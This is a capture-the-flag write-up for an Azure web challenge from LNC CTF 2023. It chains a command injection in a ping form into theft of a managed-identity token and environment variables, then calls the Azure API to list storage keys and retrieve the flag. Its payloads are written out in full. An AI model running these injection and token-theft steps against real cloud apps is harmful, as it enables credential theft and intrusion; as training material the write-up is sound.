![ManagedSecrets1](https://user-images.githubusercontent.com/84762311/233646261-6000da4b-15d8-403e-8a51-c22e559ba4e4.png)



## Description

>Today in school, I learnt how to create a website with python! There is also the networking lesson where i learn the ping command...
>
>ps the flag is not in the instance :)  
>https://lncctf2023-webapp.azurewebsites.net


## Solution

Playing around with the input, I uncovered a command injection vulnerability.
```
127.0.0.1 && ls
```
![ManagedSecrets2](https://user-images.githubusercontent.com/84762311/233647176-f2e38c1a-019b-42a6-ab0e-52496c9c8253.png)


From an article by [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#cea8), I found a command which retrieves the management token.
```
127.0.0.1 && curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
![ManagedSecrets3](https://user-images.githubusercontent.com/84762311/233648638-d3d56b88-9060-4b73-a8d8-36abbc48b2a4.png)


Extract out the subscriptionId, resourceGroupsName, accountName from the environment variables
```
127.0.0.1 && printenv
```
![ManagedSecrets4](https://user-images.githubusercontent.com/84762311/233681009-b2190ab3-5c3b-4e4c-a663-66411316628f.png)


Using postman, send a POST request to obtain access keys from the storage account. Add the access token extracted previously into the request header. Refer to [Microsoft](https://learn.microsoft.com/en-us/rest/api/storagerp/storage-accounts/list-keys?tabs=HTTP) documentation.
```
https://management.azure.com/subscriptions/d7748706-f6cc-4e9d-a1f8-1fc802191456/resourceGroups/lncctf2023_managed_secrets/providers/Microsoft.Storage/storageAccounts/lncctf2023managedsa/listKeys?api-version=2022-09-01
```
![ManagedSecrets5](https://user-images.githubusercontent.com/84762311/233681100-20e70c11-68f0-4237-bba2-58ee5842c7b7.png)


Using the [Microsoft Azure Storage Explorer](https://github.com/microsoft/AzureStorageExplorer/releases) Select Storage account or service > Account name and key. Connect to the storage using the credentials.
![ManagedSecrets6](https://user-images.githubusercontent.com/84762311/233681283-cb18c67d-967b-45fc-acff-f097bd09a958.png)

Retrieve the flag in private
![ManagedSecrets7](https://user-images.githubusercontent.com/84762311/233681578-b9c5b362-7b92-4120-80f1-cce49531e510.png)


## Flag

LNC2023{h3y_h0w_did_y0u_g3T_thi5}